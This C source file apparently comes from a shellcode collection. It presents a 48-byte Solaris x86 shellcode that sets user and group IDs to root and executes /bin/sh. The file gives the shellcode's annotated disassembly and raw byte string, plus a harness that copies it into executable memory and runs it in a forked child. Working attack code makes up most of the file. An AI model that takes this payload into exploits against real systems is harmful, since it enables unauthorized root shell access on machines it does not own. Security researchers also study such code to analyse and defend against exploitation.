#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "compiler/compiler.h"
#include "regs/stack.h"
#include "regs/state.h"

/*
 * SunOS (Solaris) / x86 setuid(0) + setgid(0) +
 * execve("/bin/sh", {"/bin/sh", NULL}, NULL) 48 bytes shellcode
 *
 * Paulus Gandung Prakosa <gandung@lists.infradead.org>
 *
 * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
 *
 * Disassembly of section .text:
 *
 * 08050428 <_start>:
 * 8050428:       33 f6                   xor    %esi,%esi
 * 805042a:       56                      push   %esi
 * 805042b:       56                      push   %esi
 * 805042c:       33 c0                   xor    %eax,%eax
 * 805042e:       b0 17                   mov    $0x17,%al
 * 8050430:       50                      push   %eax
 * 8050431:       cd 91                   int    $0x91
 * 8050433:       56                      push   %esi
 * 8050434:       56                      push   %esi
 * 8050435:       33 c0                   xor    %eax,%eax
 * 8050437:       b0 2e                   mov    $0x2e,%al
 * 8050439:       50                      push   %eax
 * 805043a:       cd 91                   int    $0x91
 * 805043c:       56                      push   %esi
 * 805043d:       68 6e 2f 73 68          push   $0x68732f6e
 * 8050442:       68 2f 2f 62 69          push   $0x69622f2f
 * 8050447:       8b dc                   mov    %esp,%ebx
 * 8050449:       56                      push   %esi
 * 805044a:       53                      push   %ebx
 * 805044b:       8b cc                   mov    %esp,%ecx
 * 805044d:       56                      push   %esi
 * 805044e:       56                      push   %esi
 * 805044f:       51                      push   %ecx
 * 8050450:       53                      push   %ebx
 * 8050451:       33 c0                   xor    %eax,%eax
 * 8050453:       b0 3b                   mov    $0x3b,%al
 * 8050455:       50                      push   %eax
 * 8050456:       cd 91                   int    $0x91
 */

#ifndef unused
#define unused(x) ((void)(x))
#endif

#ifndef SHADOW_STACK_SIZE
#define SHADOW_STACK_SIZE (1024 * 4)
#endif

int main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int ret, wstatus;
  pid_t pid;
  struct utsname uts;
  char *pcall;
  char *thread_stack;
  char *shadow_stack;
  char *shellcode = "\x33\xf6\x56\x56\x33\xc0\xb0\x17"
                    "\x50\xcd\x91\x56\x56\x33\xc0\xb0"
                    "\x2e\x50\xcd\x91\x56\x68\x6e\x2f"
                    "\x73\x68\x68\x2f\x2f\x62\x69\x8b"
                    "\xdc\x56\x53\x8b\xcc\x56\x56\x51"
                    "\x53\x33\xc0\xb0\x3b\x50\xcd\x91";

  pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  if (unlikely(pcall == MAP_FAILED)) {
    perror("mmap()");
    ret = -errno;
    goto __fallback;
  }

  shadow_stack = calloc(SHADOW_STACK_SIZE, sizeof(char));

  if (unlikely(!shadow_stack)) {
    perror("calloc()");
    ret = -errno;
    goto __must_unmap_payload;
  }

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    ret = -errno;
    goto __must_unmap_shadow_stack;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  printf("[*] Copying shellcode into crafted buffer.\n");
  memcpy(pcall, shellcode, strlen(shellcode));

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  printf("[*] Saving thread stack..\n");
  thread_stack = get_stack();

  printf("[*] Creating trivial sandbox..\n");

  pid = fork();

  if (unlikely(pid < 0)) {
    perror("fork()");
    ret = -errno;
    goto __must_restore_regs;
  }

  if (likely(!pid)) {
#ifdef THREAD_DEBUG
    printf("[*] Debug\n");
    printf(" [*] thread_stack: %p\n", thread_stack);
    printf(" [*] shadow_stack: %p\n", shadow_stack);
#endif

    printf("[*] Installing shadow stack..\n");
    set_stack(shadow_stack);

    if ((unsigned long)get_stack() != (unsigned long)shadow_stack) {
      printf("[-] Failing to install shadow stack. Fallback..\n");
      exit(1);
    }

    printf("[*] Shadow stack installed.\n");
    printf("[*] Executing the shellcode..\n");
    __asm__ __volatile__("calll *%%eax\n" : : "a"(pcall));
  } else {
    waitpid(-1, &wstatus, 0);
  }

  printf("[*] Restoring the stack..\n");
  set_stack(thread_stack);

  if ((unsigned long)get_stack() != (unsigned long)thread_stack) {
    printf("[-] Stack restoration failed. Fallback..\n");
    ret = -1;
    goto __must_restore_regs;
  }

  printf("[*] Stack restored.\n");
  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  printf("[*] Cleaning up..\n");
  free(shadow_stack);
  munmap(pcall, sysconf(_SC_PAGESIZE));

  return 0;

__must_restore_regs:
  store_regs(&__serialize_regs(cregs));

__must_unmap_shadow_stack:
  free(shadow_stack);

__must_unmap_payload:
  munmap(pcall, sysconf(_SC_PAGESIZE));

__fallback:
  return ret;
}
